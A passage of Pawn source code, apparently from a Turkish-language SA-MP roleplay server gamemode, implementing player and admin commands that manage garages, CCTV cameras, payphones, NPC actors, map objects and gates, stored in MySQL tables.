		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) != 2) return Hata(playerid, "Aracýn þöförü deðilsiniz.");
		GarajGonder(playerid, id);
	}
	else if(Buysa("cik",nstring))
	{
		if(!gGarajGirdi[playerid] || GetPlayerVirtualWorld(playerid) > MAX_GARAJ) return Hata(playerid, "Garajýn içerisinde deðilsiniz.");
		new id=GetPlayerVirtualWorld(playerid);
		if(Garaj[id][gkilit]) return Hata(playerid, "Garaj kilitli.");
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) != 2) return Hata(playerid, "Aracýn þöförü deðilsiniz.");
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new vid=GetPlayerVehicleID(playerid);
		    if(Garaj[id][gax] == 0 || Garaj[id][gay] == 0 || Garaj[id][gaz] == 0)
			{
				SetVehiclePos(vid, Garaj[id][gx], Garaj[id][gy], Garaj[id][gz]);
			}
			else
			{
				SetVehiclePos(vid, Garaj[id][gax], Garaj[id][gay], Garaj[id][gaz]);
				SetVehicleZAngle(vid, Garaj[id][garz]);
			}
			LinkVehicleToInterior(vid, Garaj[id][gint]);
			foreach(new i : Player)
			{
			    if(IsPlayerInVehicle(i, vid))
			    {
					DONDUR(i);
				    SetPlayerInterior(i, Garaj[id][gint]);
				    SetPlayerVirtualWorld(i, Garaj[id][gvw]);
				    UnfreezeTimerVar[i] = SetTimerEx("UnfreezeTimer", 2750, false, "u", i);
				}
			}
		    SetVehicleVirtualWorld(vid, Garaj[id][gvw]);
		}
		else
		{
		    DONDUR(playerid);
		    SetPlayerPos(playerid, Garaj[id][gx], Garaj[id][gy], Garaj[id][gz]);
		    SetPlayerInterior(playerid, Garaj[id][gint]);
		    SetPlayerVirtualWorld(playerid, Garaj[id][gvw]);
		    UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 2750, false, "u", playerid);
		}
		gGarajGirdi[playerid] = false;
		new query[128];
		format(query, sizeof(query), "UPDATE `karakterler` SET `garajda` = '0' WHERE `id` = '%d'",Karakter[playerid][sqlid]);
		mysql_tquery(1,query);
	}
	else if(Buysa("kilit",nstring))
	{
	    new id=-1;
	    if(!gGarajGirdi[playerid])
		{
		    for(new i; i<MAX_GARAJ;i++)
			{
			    if(IsValidDynamicPickup(Garaj[i][gpickup]))
			    {
			        if(IsPlayerInRangeOfPoint(playerid, 5, Garaj[i][gx], Garaj[i][gy], Garaj[i][gz]) && GetPlayerVirtualWorld(playerid) == Garaj[i][gvw])
			        {
						id=i;
						break;
			        }
				}
			}
			if(id==-1) return Hata(playerid, "Garajýn yakýnýnda deðilsiniz.");
		}
		else
		{
			id = GetPlayerVirtualWorld(playerid);
		}
		if(Garaj[id][gsahip] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu garajý kilitleyemezsiniz.");
		switch(Garaj[id][gkilit])
		{
		    case 0:
		    {
		        Bilgi(playerid, "Garajý kilitlediniz.");
		        Garaj[id][gkilit] = 1;
		    }
		    case 1:
		    {
		        Bilgi(playerid, "Garajýn kilidini açtýnýz.");
		        Garaj[id][gkilit] = 0;
		    }
		}
		GarajKaydet(id);
	}
	else return Kullanim(playerid, "/garaj [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: gir, cik, kilit");
	return 1;
}

CMD:agaraj(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
	new nstring[16],_gid=-1;
	if(isnull(params)) return Kullanim(playerid, "/agaraj [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: yarat, sil, duzenle, id, liste, git");
    sscanf(params,"s[16]d",nstring,_gid);
	if(Buysa("liste",params))
	{
	    SendClientMessage(playerid, -1, "________________GARAJLAR__________________");
	    for(new i; i<MAX_GARAJ;i++)
		{
		    if(IsValidDynamicPickup(Garaj[i][gpickup]))
		    {
		    	SendClientMessageEx(playerid, -1, "ID:%d - Kilit:%d - Ýsim:%s - Sahip:%d - Birlik:%d",Garaj[i][gid],Garaj[i][gkilit],Garaj[i][gisim],Garaj[i][gsahip],Garaj[i][gbirlik]);
		    }
		}
	}
	else if(Buysa("id",nstring))
	{
	    SendClientMessage(playerid, -1, "Yakýnýnýzdaki Garaj:");
	    for(new i; i<MAX_GARAJ;i++)
		{
		    if(IsValidDynamicPickup(Garaj[i][gpickup]))
		    {
		        if(IsPlayerInRangeOfPoint(playerid, 5, Garaj[i][gx], Garaj[i][gy], Garaj[i][gz]) && GetPlayerVirtualWorld(playerid) == Garaj[i][gvw])
		    		SendClientMessageEx(playerid, -1, "ID:%d - Kilit:%d - Ýsim:%s - Sahip:%d - Birlik:%d",Garaj[i][gid],Garaj[i][gkilit],Garaj[i][gisim],Garaj[i][gsahip],Garaj[i][gbirlik]);
		    }
		}
	}
	else if(Buysa("git",nstring))
	{
	    if(_gid == -1 || !IsValidDynamicPickup(Garaj[_gid][gpickup])) return Kullanim(playerid, "/agaraj git [garajid]");
	    SetPlayerPos(playerid, Garaj[_gid][gx], Garaj[_gid][gy], Garaj[_gid][gz]);
	    SetPlayerInterior(playerid, Garaj[_gid][gint]);
		SetPlayerVirtualWorld(playerid, Garaj[_gid][gvw]);
	}
	else if(Buysa("sil",nstring))
	{
	    if(_gid == -1 || !IsValidDynamicPickup(Garaj[_gid][gpickup])) return Kullanim(playerid, "/agaraj sil [garajid]");
		new mstring[128];
	    format(mstring, sizeof(mstring), "DELETE FROM `garajlar` WHERE `id` = '%d'",_gid);
	    mysql_tquery(1,mstring);
	    format(mstring, sizeof(mstring), "%d idli garajý sildiniz.",_gid);
	    Bilgi(playerid, mstring);
	    DestroyDynamicPickup(Garaj[_gid][gpickup]);
		DestroyDynamic3DTextLabel(Garaj[_gid][glabel]);
		Garaj[_gid][gx] = 0.0;
		Garaj[_gid][gy] = 0.0;
		Garaj[_gid][gz] = 0.0;
		Garaj[_gid][gint] = 0;
		Garaj[_gid][gvw] = 0;
		Garaj[_gid][gicint] = 0;
		Garaj[_gid][gsahip] = -1;
		Garaj[_gid][gbirlik] = -1;
		Garaj[_gid][gkilit] = 0;
		format(Garaj[_gid][gisim], 32, "");
	}
	else if(Buysa("yarat",nstring))
	{
	    new query[128],Float:pPos[4];
	    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		format(query, sizeof(query), "INSERT INTO garajlar (`x`,`y`,`z`,`sahip`,`birlik`,`kilit`) VALUES ('%f','%f','%f','-1','-1','1')",pPos[0],pPos[1],pPos[2]);
		new Cache:cache = mysql_query(query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		Garaj[i][gid] = i;
		Garaj[i][gx] = pPos[0];
		Garaj[i][gy] = pPos[1];
		Garaj[i][gz] = pPos[2];
		Garaj[i][gint] = GetPlayerInterior(playerid);
		Garaj[i][gvw] = GetPlayerVirtualWorld(playerid);
		Garaj[i][gicint] = 0;
		Garaj[i][gsahip] = -1;
		Garaj[i][gbirlik] = -1;
		Garaj[i][gkilit] = 1;
		format(Garaj[i][gisim], 32, "");
		new mstring[128];
		format(mstring, sizeof(mstring), "{435761}GARAJ\n\n{FFFFFF}%s",Garaj[i][gisim]);
		Garaj[i][gpickup] = CreateDynamicPickup(19132, 1, Garaj[i][gx],Garaj[i][gy],Garaj[i][gz], Garaj[i][gvw], Garaj[i][gint], -1, 100.0);
        Garaj[i][glabel] = CreateDynamic3DTextLabel(mstring, -1,Garaj[i][gx],Garaj[i][gy],Garaj[i][gz], 10.0, .worldid=Garaj[i][gvw], .interiorid=Garaj[i][gint]);
		GarajKaydet(i);
		format(mstring, sizeof(mstring), "Baþarýyla garaj yarattýnýz. id:%d",i);
		Bilgi(playerid, mstring);
	}
	else if(Buysa("duzenle",nstring))
	{
	    if( _gid == -1 || !IsValidDynamicPickup(Garaj[_gid][gpickup])) return Kullanim(playerid, "/agaraj duzenle [garajid]");
	    GarajDuzenle(playerid,_gid);
	}
	else
	{
		Kullanim(playerid, "/agaraj [fonksiyon]");
		SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: yarat, sil, duzenle, id, liste, git");
	}
	return 1;
}

CMD:cctv(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 0;
	if(Karakter[playerid][rutbe] > 18) return Hata(playerid, "Bu komutu kullanma yetkiniz yok. [Memur II ve üstü]");
	if(GetPVarInt(playerid, "CCTV_Izliyor")){
        //TogglePlayerSpectating(playerid, false);
		SetPlayerCamera(playerid, 0);
		DONDUR(playerid);
		SetPlayerPos(playerid, GetPVarFloat(playerid,"cPosX"), GetPVarFloat(playerid,"cPosY"), GetPVarFloat(playerid,"cPosZ"));
		SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "cVw"));
		SetPlayerInterior(playerid, GetPVarInt(playerid, "cInt"));
        SetCameraBehindPlayer(playerid);
        SetTimerEx("CozEvladim", 3000, 0, "i", playerid);
        DeletePVar(playerid, "CCTV_Izliyor");
	}
	else{
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, Veriler[cctvx], Veriler[cctvy], Veriler[cctvz])) return Hata(playerid, "CCTV izleme odasýnda deðilsiniz.");
		new mstring[1024];
		for(new i=0;i<MAX_CCTV;i++) {
		    if(!IsValidDynamicObject(CCTV[i][c_object])) continue;
			format(mstring, sizeof(mstring), "%s\n"NOKTA" %s",mstring, CCTV[i][c_name]);
		}
		ShowPlayerDialog(playerid, 428, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"CCTV", mstring, "Seç", "Ýptal");
	}
	return 1;
}

CMD:atelefon(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new num;
	for(new i=0;i<MAX_ANKESORLU_TELEFON;i++) {
 		if(!IsValidDynamicObject(ATelefon[i][a_object])) continue;
		if(IsPlayerNearDynamicObject(playerid, ATelefon[i][a_object])) {
			if(sscanf(params,"d",num)) { Kullanim(playerid, "/atelefon [TelNo]"); Ipucu(playerid, "1 dakikasý 5$ olarak belirlenmiþtir. 1 dakika sonra telefonunuz kapatýlacaktýr."); return 1; }
			if(GetPlayerCash(playerid) < 5) return Hata(playerid, "Yeterli paranýz yok.");
			return Hata(playerid, "Ýnaktif.");
		}
	}
	Hata(playerid, "Hiç bir ankesörlü telefonun yakýnýnda deðilsiniz.");
	return 1;
}

CMD:antelefon(playerid, params[])
{
    if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
    new nstring[16],_id=-1;
    sscanf(params,"s[16]d",nstring,_id);
	if(isnull(nstring)) return Kullanim(playerid, "/antelefon [kur/duzenle/id/liste/git/sil]");
	if(Buysa(nstring,"kur"))
	{
	    new _query[128],Float:pPos[3];
	    GetXYInFrontOfPlayer(playerid, pPos[0], pPos[1], pPos[2], 1);
		format(_query, sizeof(_query), "INSERT INTO ankesortelefon (`x`,`y`,`z`) VALUES ('%f','%f','%f')",pPos[0],pPos[1],pPos[2]);
		new Cache:cache = mysql_query(_query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		ATelefon[i][a_id] = i;
		ATelefon[i][a_x] = pPos[0];
		ATelefon[i][a_y] = pPos[1];
		ATelefon[i][a_z] = pPos[2];
		ATelefon[i][a_rx] = 0;
		ATelefon[i][a_ry] = 0;
		ATelefon[i][a_rz] = 0;
		ATelefon[i][a_object] = CreateDynamicObject(ATELEFON_MODEL, ATelefon[i][a_x], ATelefon[i][a_y], ATelefon[i][a_z], ATelefon[i][a_rx], ATelefon[i][a_ry], ATelefon[i][a_rz]);
		Streamer_Update(playerid);
		ObjeKurdu(playerid);
		EditDynamicObject(playerid, ATelefon[i][a_object]);
		SetPVarInt(playerid, "AnkesorluTelefonDuzenliyor", 1);
	    SetPVarInt(playerid, "DuzenleAnkesorluTelefon", i);
		new _mstring[128];
		format(_mstring, sizeof(_mstring), "Baþarýyla ankesörlü telefon kurdunuz.ID:%d",i);
		Bilgi(playerid,_mstring);
	}
	else if(Buysa("duzenle",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/antelefon duzenle [ankesörlü telefon id]");
	    if(!IsValidDynamicObject(ATelefon[_id][a_object])) return Hata(playerid, "Hatalý ankesörlü telefon id belirttiniz.");
	    SetPVarInt(playerid, "AnkesorluTelefonDuzenliyor", 1);
	    SetPVarInt(playerid, "DuzenleAnkesorluTelefon", _id);
	    EditDynamicObject(playerid, ATelefon[_id][a_object]);
	}
	else if(Buysa("id",nstring))
	{
	    SendClientMessage(playerid, -1, "Yakýndaki Ankesörlü Telefonlar:");
	    for(new i=0;i<MAX_ANKESORLU_TELEFON;i++) {
	        if(!IsValidDynamicObject(ATelefon[i][a_object])) continue;
			if(IsPlayerInRangeOfPoint(playerid, 5.0, ATelefon[i][a_x], ATelefon[i][a_y], ATelefon[i][a_z])) {
				SendClientMessageEx(playerid, -1, "id:%d - SQLID:%d",i,ATelefon[i][a_id]);
			}
		}
	}
	else if(Buysa("liste",nstring))
	{
	    SendClientMessage(playerid, -1,"__________Ankesörlü Telefon__________");
	    for(new i=0;i<MAX_ANKESORLU_TELEFON;i++) {
	        if(!IsValidDynamicObject(ATelefon[i][a_object])) continue;
			SendClientMessageEx(playerid, -1, "id:%d - SQLID:%d",i,ATelefon[i][a_id]);
		}
	}
	else if(Buysa("git",nstring))
	{
		if(_id == -1) return Kullanim(playerid, "/antelefon git [ankesörlü telefon id]");
		if(!IsValidDynamicObject(ATelefon[_id][a_object])) return Hata(playerid, "Hatalý ankesörlü telefon id belirttiniz.");
		DONDUR(playerid);
		SetPlayerPos(playerid, ATelefon[_id][a_x], ATelefon[_id][a_y], ATelefon[_id][a_z]+1);
		SetPlayerVirtualWorld(playerid, 0);
		COZ(playerid);
	}
	else if(Buysa("sil",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/antelefon sil [ankesörlü telefon id]");
	    if(!IsValidDynamicObject(ATelefon[_id][a_object])) return Hata(playerid, "Hatalý ankesörlü telefon id.");
	    ATelefon[_id][a_x] = 0;
	    ATelefon[_id][a_y] = 0;
	    ATelefon[_id][a_z] = 0;
	    ATelefon[_id][a_rx] = 0;
	    ATelefon[_id][a_ry] = 0;
	    ATelefon[_id][a_rz] = 0;
	    DestroyDynamicObject(ATelefon[_id][a_object]);
	    DestroyDynamic3DTextLabel(ATelefon[_id][a_textlabel]);
	    new query[128];
	    format(query, sizeof(query), "DELETE FROM `ankesortelefon` WHERE `id` = '%d'",ATelefon[_id][a_id]);
	    mysql_tquery(1, query);
	    ATelefon[_id][a_id] = 0;
	    Bilgi(playerid, "Ankesörlü telefon silindi.");
	}
	else return Kullanim(playerid, "/antelefon [kur/duzenle/id/liste/git/sil]");
	return 1;
}

CMD:acctv(playerid, params[])
{
    if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
    new nstring[16],_id=-1,_angle=-1;
    sscanf(params,"s[16]dd",nstring,_id,_angle);
	if(isnull(nstring)) return Kullanim(playerid, "/acctv [kur/duzenle/angle/id/liste/git/sil]");
	if(Buysa(nstring,"kur"))
	{
	    ShowPlayerDialog(playerid, 429, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"ACCTV", "CCTV ismini girin:", "Gir", "Ýptal");
	}
	else if(Buysa("angle",nstring))
	{
	    if(_id == -1 || _angle == -1) return Kullanim(playerid, "/acctv angle [cctv id] [angle]");
	    if(!IsValidDynamicObject(CCTV[_id][c_object])) return Hata(playerid, "Hatalý cctv id belirttiniz.");
	    new mstring[64];
	    format(mstring, sizeof(mstring), "CCTV angle %d olarak ayarlandý.",_angle);
	    Bilgi(playerid, mstring);
	    CCTV[_id][c_angle] = _angle;
	}
	else if(Buysa("duzenle",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/acctv duzenle [cctv id]");
	    if(!IsValidDynamicObject(CCTV[_id][c_object])) return Hata(playerid, "Hatalý cctv id belirttiniz.");
	    SetPVarInt(playerid, "CCTV_Duzenliyor", 1);
	    SetPVarInt(playerid, "DuzenleCCTV", _id);
	    EditDynamicObject(playerid, CCTV[_id][c_object]);
	}
	else if(Buysa("id",nstring))
	{
	    SendClientMessage(playerid, -1, "Yakýndaki CCTV'ler:");
	    for(new i=0;i<MAX_CCTV;i++) {
	        if(!IsValidDynamicObject(CCTV[i][c_object])) continue;
			if(IsPlayerInRangeOfPoint(playerid, 5.0, CCTV[i][c_px], CCTV[i][c_py], CCTV[i][c_pz])) {
				SendClientMessageEx(playerid, -1, "%s(id:%d) -SQLID:%d",CCTV[i][c_name],i,CCTV[i][c_id]);
			}
		}
	}
	else if(Buysa("liste",nstring))
	{
	    SendClientMessage(playerid, -1,"__________CCTV__________");
	    for(new i=0;i<MAX_CCTV;i++) {
	        if(!IsValidDynamicObject(CCTV[i][c_object])) continue;
			SendClientMessageEx(playerid, -1, "%s(id:%d) -SQLID:%d",CCTV[i][c_name],i,CCTV[i][c_id]);
		}
	}
	else if(Buysa("git",nstring))
	{
		if(_id == -1) return Kullanim(playerid, "/acctv git [cctv id]");
		if(!IsValidDynamicObject(CCTV[_id][c_object])) return Hata(playerid, "Hatalý cctv id belirttiniz.");
		DONDUR(playerid);
		SetPlayerPos(playerid, CCTV[_id][c_px], CCTV[_id][c_py], CCTV[_id][c_pz]);
		SetPlayerInterior(playerid, CCTV[_id][c_int]);
		SetPlayerVirtualWorld(playerid, CCTV[_id][c_vw]);
		COZ(playerid);
	}
	else if(Buysa("sil",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/acctv sil [cctv id]");
	    if(!IsValidDynamicObject(CCTV[_id][c_object])) return Hata(playerid, "Hatalý cctv id.");
	    format(CCTV[_id][c_name],65,"");
	    CCTV[_id][c_px] = 0;
	    CCTV[_id][c_py] = 0;
	    CCTV[_id][c_pz] = 0;
	    CCTV[_id][c_rx] = 0;
	    CCTV[_id][c_ry] = 0;
	    CCTV[_id][c_rz] = 0;
	    CCTV[_id][c_int] = 0;
	    CCTV[_id][c_vw] = 0;
	    DestroyDynamicObject(CCTV[_id][c_object]);
	    new query[128];
	    format(query, sizeof(query), "DELETE FROM `cctv` WHERE `id` = '%d'",CCTV[_id][c_id]);
	    mysql_tquery(1, query);
	    CCTV[_id][c_id] = 0;
	    Bilgi(playerid, "CCTV silindi.");
	}
	else return Kullanim(playerid, "/acctv [kur/duzenle/id/liste/git/sil]");
	return 1;
}

CMD:aactor(playerid, params[])
{
    if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 5) return 1;
    new nstring[16],_id=-1;
	if(isnull(params)) return Kullanim(playerid, "/aactor [yarat, id, duzenle, sil]");
	sscanf(params,"s[16]d",nstring,_id);
	if(Buysa("yarat",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/aactor yarat [skin]");
	    new query[128],Float:pPos[4],_skin=_id;
		format(query, sizeof(query), "INSERT INTO actor (`skin`) VALUES ('%d')",_skin);
		new Cache:cache = mysql_query(query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		GetPlayerFacingAngle(playerid, pPos[3]);
		GetXYInFrontOfPlayerEx(playerid, pPos[0], pPos[1], 1);
		Actor[i][aid] = i;
		Actor[i][ax] = pPos[0];
		Actor[i][aay] = pPos[1];
		Actor[i][az] = pPos[2];
		Actor[i][arz] = pPos[3];
		Actor[i][askin] =_skin;
		Actor[i][aint] = GetPlayerInterior(playerid);
		Actor[i][avw] = GetPlayerVirtualWorld(playerid);
		Actor[i][arenk] = 0;
		Actor[i][aactor] = CreateDynamicActor(Actor[i][askin], Actor[i][ax], Actor[i][aay], Actor[i][az], Actor[i][arz], .worldid=Actor[i][avw], .interiorid=Actor[i][aint]);
		Actor[i][adtext] = CreateDynamic3DTextLabel("", (Actor[i][arenk] == 0 ? COLOR_GREY : Actor[i][arenk]), Actor[i][ax], Actor[i][aay], Actor[i][az] + 0.9, 15, .worldid=Actor[i][avw], .interiorid=Actor[i][aint], .testlos=1);
		new mstring[128];
		format(mstring, sizeof(mstring), "Baþarýyla actor yarattýnýz.ID:%d",i);
		Bilgi(playerid,mstring);
		Streamer_Update(playerid);
		ActorKaydet(i);
	}
	else if(Buysa("id",nstring))
	{
	    SendClientMessage(playerid, -1, "Yakýndaki Actorler:");
	    for(new i;i<MAX_ACTOR;i++)
		{
		    if(IsValidDynamicActor(Actor[i][aactor]) && IsPlayerInRangeOfPoint(playerid, 1.0, Actor[i][ax], Actor[i][aay], Actor[i][az]) && GetPlayerVirtualWorld(playerid) == Actor[i][avw]) {
				SendClientMessageEx(playerid, -1, "sqlid:%d - id:%d - isim:%s - skin:%d", Actor[i][aid], i, Actor[i][aisim], Actor[i][askin]);
			}
		}
	}
	else if(Buysa("duzenle",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/aactor duzenle [actor id]");
	    if(!IsValidDynamicActor(Actor[_id][aactor])) return Hata(playerid, "Hatalý actor id belirttiniz.");
	    SetPVarInt(playerid, "ActorDuzenle", _id);
		ShowPlayerDialog(playerid, 430, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Actor", ""NOKTA" Ýsim Düzenle\n"NOKTA" Skin Düzenle\n"NOKTA" Pozisyon Düzenle\n"NOKTA" Renk Düzenle\n"NOKTA" Anim Düzenle", "Seç", "Ýptal");
	}
	else if(Buysa("sil",nstring))
	{
	    if(_id == -1) return Kullanim(playerid, "/aactor sil [actor id]");
	    if(!IsValidDynamicActor(Actor[_id][aactor])) return Hata(playerid, "Hatalý actor id belirttiniz.");
	    Actor[_id][askin] = 0;
	    Actor[_id][ax] = 0;
	    Actor[_id][aay] = 0;
	    Actor[_id][az] = 0;
	    Actor[_id][arz] = 0;
	    Actor[_id][arenk] = 0;
	    Actor[_id][avw] = 0;
	    Actor[_id][aint] = 0;
	    format(Actor[_id][aanim], 255, "");
	    format(Actor[_id][askin], 255, "");
	    DestroyDynamicActor(Actor[_id][aactor]);
	    DestroyDynamic3DTextLabel(Actor[_id][adtext]);
	    new query[128];
	    format(query, sizeof(query), "DELETE FROM `actor` WHERE `id` = '%d'",Actor[_id][aid]);
	    mysql_tquery(1, query);
	    Actor[_id][aid] = 0;
	    Bilgi(playerid, "Actor'u sildiniz.");
	}
	else return Kullanim(playerid, "/aactor [yarat, id, duzenle, sil]");
	return 1;
}

CMD:aobje(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 6) return 1;
	if(isnull(params)) return Kullanim(playerid, "/aobje [kur,duzenle,yid,id,liste,sil,texture,git]");
	new nstring[32],gmodell=-1;
	new _tModel=-1,_tName1[32],_tName2[32];
	sscanf(params,"s[32]dds[32]s[32]",nstring,gmodell,_tModel,_tName1,_tName2);
	if(Buysa("kur",nstring))
	{
		if(gmodell == -1) return Kullanim(playerid, "/aobje kur [modelid]");
		new query[128],Float:pPos[4];
		format(query, sizeof(query), "INSERT INTO objeler (`model`) VALUES ('%d')",gmodell);
		new Cache:cache = mysql_query(query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		GetPlayerFacingAngle(playerid, pPos[3]);
		pPos[3] = pPos[3]+180;
		Obje[i][oid] = i;
		Obje[i][ox] = pPos[0];
		Obje[i][oy] = pPos[1];
		Obje[i][oz] = pPos[2];
		Obje[i][orx] = 0;
		Obje[i][ory] = 0;
		Obje[i][orz] = pPos[3];
		Obje[i][omodel] = gmodell;
		Obje[i][oint] = GetPlayerInterior(playerid);
		Obje[i][ovw] = GetPlayerVirtualWorld(playerid);
		Obje[i][oobje] = CreateDynamicObject(Obje[i][omodel], Obje[i][ox], Obje[i][oy], Obje[i][oz], 0,0, Obje[i][orz], .worldid=Obje[i][ovw], .interiorid=Obje[i][oint]);
		ObjeKurdu(playerid);
		new mstring[128];
		format(mstring, sizeof(mstring), "Baþarýyla obje yarattýnýz.ID:%d",i);
		Bilgi(playerid,mstring);
		Streamer_Update(playerid);
		ObjeKaydet(i);
	}
	else if(Buysa("git",nstring))
	{
		if(gmodell == -1) return Kullanim(playerid, "/aobje git [obje id]");
		if(!IsValidDynamicObject(Obje[gmodell][oobje])) return Hata(playerid, "Hatalý obje id belirttiniz.");
		DONDUR(playerid);
		SetPlayerPos(playerid, Obje[gmodell][ox], Obje[gmodell][oy], Obje[gmodell][oz]+1);
		SetPlayerInterior(playerid, Obje[gmodell][oint]);
		SetPlayerVirtualWorld(playerid, Obje[gmodell][ovw]);
		COZ(playerid);
	}
	else if(Buysa("texture",nstring))
	{
	    if(_tModel == -1 || isnull(_tName1) || isnull(_tName2)) return Kullanim(playerid, "/aobje texture [obje id] [modelid] [txd name] [texture name]");
	    if(!IsValidDynamicObject(Obje[gmodell][oobje])) return Hata(playerid, "Hatalý obje id belirttiniz.");
		Obje[gmodell][otmodel] = _tModel;
		format(Obje[gmodell][otname1], 32, "%s", _tName1);
		format(Obje[gmodell][otname2], 32, "%s", _tName2);
		ObjeKaydet(gmodell);
		ObjeTextureVer(gmodell);
		Bilgi(playerid, "Objenin texture'sini deðiþtirdiniz.");
	}
	else if(Buysa("duzenle",nstring))
	{
	    if(gmodell == -1 || gmodell > MAX_OBJE) return Kullanim(playerid, "/aobje duzenle [obje id]");
	    if(!IsValidDynamicObject(Obje[gmodell][oobje])) return Hata(playerid, "Hatalý obje id belirttiniz.");
	    objeduzenle[playerid] = 1;
	    EditDynamicObject(playerid, Obje[gmodell][oobje]);
	}
	else if(Buysa("id",nstring))
	{
	    if(objegoruyor[playerid] == 0)
	    {
			objegoruyor[playerid] = 1;
			new mstring[64];
			for(new i;i<MAX_OBJE;i++)
	  		{
				if(IsValidDynamicObject(Obje[i][oobje]))
				{
					format(mstring, sizeof(mstring), "{FFFFFF}Obje[{fb5a02}%d{FFFFFF}]",i);
				    Obje[i][glabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Obje[i][ox],Obje[i][oy],Obje[i][oz]+1.3,5.0);
				}
			}
			Ipucu(playerid, "Obje ID'leri görüyorsunuz.");
		}
		else if(objegoruyor[playerid] == 1)
		{
		    objegoruyor[playerid] = 0;
			for(new i;i<MAX_OBJE;i++)
	  		{
				if(IsValidDynamicObject(Obje[i][oobje]))
				{
				    DeletePlayer3DTextLabel(playerid,Obje[i][glabel]);
				}
			}
			Ipucu(playerid, "Obje ID'leri görmüyorsunuz.");
		}
	}
	else if(Buysa("yid",nstring))
	{
        for(new i;i<MAX_OBJE;i++)
	    {
	        if(!IsValidDynamicObject(Obje[i][oobje])) continue;
	        if(IsPlayerNearDynamicObject(playerid, Obje[i][oobje]))
	        {
		        SendClientMessage(playerid, -1, "Yakýnýnýzdaki Objeler:");
			    new mstring[400];
			    format(mstring, sizeof(mstring),"SQLID:%d - ID:%d - Model:%d - X:%f - Y:%f - Z:%f",Obje[i][oid],i,Obje[i][omodel],Obje[i][ox],Obje[i][oy],Obje[i][oz]);
				SendClientMessage(playerid, -1, mstring);
			}
		}
	}
	else if(Buysa("liste",nstring))
	{
	    SendClientMessage(playerid, -1,"__________OBJELER_________");
	    for(new i;i<MAX_OBJE;i++)
	    {
	        if(!IsValidDynamicObject(Obje[i][oobje])) continue;
		    new mstring[400];
		    format(mstring, sizeof(mstring),"SQLID:%d - ID:%d - Model:%d - X:%f - Y:%f - Z:%f",Obje[i][oid],i,Obje[i][omodel],Obje[i][ox],Obje[i][oy],Obje[i][oz]);
			SendClientMessage(playerid, -1, mstring);
		}
	}
	else if(Buysa("sil",nstring))
	{
	    if(gmodell == -1) return Kullanim(playerid, "/aobje sil [obje id]");
	    if(!IsValidDynamicObject(Obje[gmodell][oobje])) return Hata(playerid, "Hatalý obje id.");
	    new id=gmodell;
	    Obje[id][omodel] = 0;
	    Obje[id][ox] = 0;
	    Obje[id][oy] = 0;
	    Obje[id][oz] = 0;
	    Obje[id][orx] = 0;
	    Obje[id][ory] = 0;
	    Obje[id][orz] = 0;
	    DestroyDynamicObject(Obje[id][oobje]);
	    new query[128];
	    format(query, sizeof(query), "DELETE FROM `objeler` WHERE `id` = '%d'",Obje[id][oid]);
	    mysql_tquery(1, query);
	    Obje[id][oid] = 0;
	    Bilgi(playerid, "Objeyi sildiniz.");
	    if(objegoruyor[playerid] == 1)
	    {
	    	DeletePlayer3DTextLabel(playerid,Obje[id][glabel]);
	    }
	}
	return 1;
}

CMD:agate(playerid, params[])
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 6) return 1;
	if(isnull(params)) return Kullanim(playerid, "/agate [kur,duzenle,yid,id,liste,sil,texture,git]");
	new nstring[32],gmodell=-1;
	new _tModel=-1,_tName1[32],_tName2[32];
	sscanf(params,"s[32]dds[32]s[32]",nstring,gmodell,_tModel,_tName1,_tName2);
	if(Buysa("kur",nstring))
	{
		if(gmodell == -1) return Kullanim(playerid, "/agate kur [modelid]");
		new query[128],Float:pPos[4];
		format(query, sizeof(query), "INSERT INTO gate (`model`) VALUES ('%d')",gmodell);
		new Cache:cache = mysql_query(query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		GetPlayerFacingAngle(playerid, pPos[3]);
		pPos[3] = pPos[3]+180;
		Gate[i][gid] = i;
		Gate[i][gx] = pPos[0];
		Gate[i][gy] = pPos[1];
		Gate[i][gz] = pPos[2];
		Gate[i][grx] = 0;
		Gate[i][gry] = 0;
		Gate[i][grz] = pPos[3];
		Gate[i][gox] = 0;
		Gate[i][goy] = 0;
		Gate[i][goz] = 0;
		Gate[i][gorx] = 0;
		Gate[i][gory] = 0;
		Gate[i][gorz] = 0;
		Gate[i][gmodel] = gmodell;
		Gate[i][gsahip] = -1;
